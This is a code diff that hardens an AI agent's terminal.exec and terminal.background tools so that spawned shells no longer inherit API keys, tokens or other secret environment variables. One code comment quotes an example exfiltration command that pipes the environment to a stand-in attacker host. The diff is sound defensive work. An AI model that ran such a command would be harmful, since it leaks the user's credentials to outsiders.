@@ -180,20 +180,40 @@ function resolveTerminalCommandPlan(input: Record<string, unknown>): {
   };
 }
 
+/**
+ * Env sanitizer for spawned shells. Agent tools that call `exec`/`spawn` via
+ * terminal.exec or terminal.background previously inherited full `process.env`,
+ * so any shell the agent ran could exfiltrate OPENAI_API_KEY / DASHBOARD_TOKEN
+ * with `env | curl evil.com -d @-`. This strips anything matching the sensitive
+ * name pattern before handoff.
+ */
+function sanitizeChildEnv(base: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
+  const sanitized: NodeJS.ProcessEnv = {};
+  const sensitive = /(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH|COOKIE|SESSION|BEARER|API_|PRIVATE)/i;
+  for (const [name, value] of Object.entries(base)) {
+    if (sensitive.test(name)) continue;
+    sanitized[name] = value;
+  }
+  return sanitized;
+}
+
+type ChildExecOptions = { cwd?: string; timeout?: number; maxBuffer?: number; env?: NodeJS.ProcessEnv };
+type ChildSpawnOptions = { stdio: 'ignore'; detached: boolean; cwd?: string; env?: NodeJS.ProcessEnv };
+
 async function loadChildProcessModule(): Promise<{
-  exec(command: string, options: { cwd?: string; timeout?: number; maxBuffer?: number }, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
-  execFile(file: string, args: string[], options: { cwd?: string; maxBuffer?: number }, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
-  spawn(command: string, args: string[], options: { stdio: 'ignore'; detached: boolean; cwd?: string }): {
+  exec(command: string, options: ChildExecOptions, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
+  execFile(file: string, args: string[], options: { cwd?: string; maxBuffer?: number; env?: NodeJS.ProcessEnv }, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
+  spawn(command: string, args: string[], options: ChildSpawnOptions): {
     pid?: number;
     kill(signal?: string): boolean;
     on?(event: string, cb: (code: number | null) => void): void;
     unref?(): void;
   };
 }> {
-  return import('node:child_process') as Promise<{
-    exec(command: string, options: { cwd?: string; timeout?: number; maxBuffer?: number }, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
-    execFile(file: string, args: string[], options: { cwd?: string; maxBuffer?: number }, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
-    spawn(command: string, args: string[], options: { stdio: 'ignore'; detached: boolean; cwd?: string }): {
+  return import('node:child_process') as unknown as Promise<{
+    exec(command: string, options: ChildExecOptions, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
+    execFile(file: string, args: string[], options: { cwd?: string; maxBuffer?: number; env?: NodeJS.ProcessEnv }, callback: (error: Error | null, stdout: string, stderr: string) => void): unknown;
+    spawn(command: string, args: string[], options: ChildSpawnOptions): {
       pid?: number;
       kill(signal?: string): boolean;
       on?(event: string, cb: (code: number | null) => void): void;
@@ -205,7 +225,7 @@ async function loadChildProcessModule(): Promise<{
 async function runGitCommand(args: string[], cwd?: string): Promise<{ ok: boolean; stdout: string; stderr: string }> {
   const cp = await loadChildProcessModule();
   return new Promise((resolve) => {
-    cp.execFile('git', args, { cwd, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+    cp.execFile('git', args, { cwd, maxBuffer: 1024 * 1024, env: sanitizeChildEnv() }, (error, stdout, stderr) => {
       resolve({
         ok: !error,
         stdout: stdout ?? '',
@@ -467,7 +487,7 @@ export function createTerminalExecTool(): ToolDefinition {
       const timeoutMs = typeof input.timeoutMs === 'number' && Number.isFinite(input.timeoutMs) ? input.timeoutMs : undefined;
       const childProcess = await loadChildProcessModule();
       return await new Promise<ToolExecutionResult>((resolve) => {
-        childProcess.exec(resolvedCommand, { cwd, timeout: timeoutMs, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+        childProcess.exec(resolvedCommand, { cwd, timeout: timeoutMs, maxBuffer: 1024 * 1024, env: sanitizeChildEnv() }, (error, stdout, stderr) => {
           resolve({
             toolName: 'terminal.exec',
             runtime: 'worker',
@@ -551,7 +571,8 @@ export function createTerminalBackgroundTool(): ToolDefinition {
       const child = childProcess.spawn('/bin/sh', ['-lc', resolvedCommand], {
         stdio: 'ignore',
         detached: true,
-        cwd
+        cwd,
+        env: sanitizeChildEnv()
       });
       child.unref?.();
       const pid = child.pid ?? Math.floor(Math.random() * 100000);
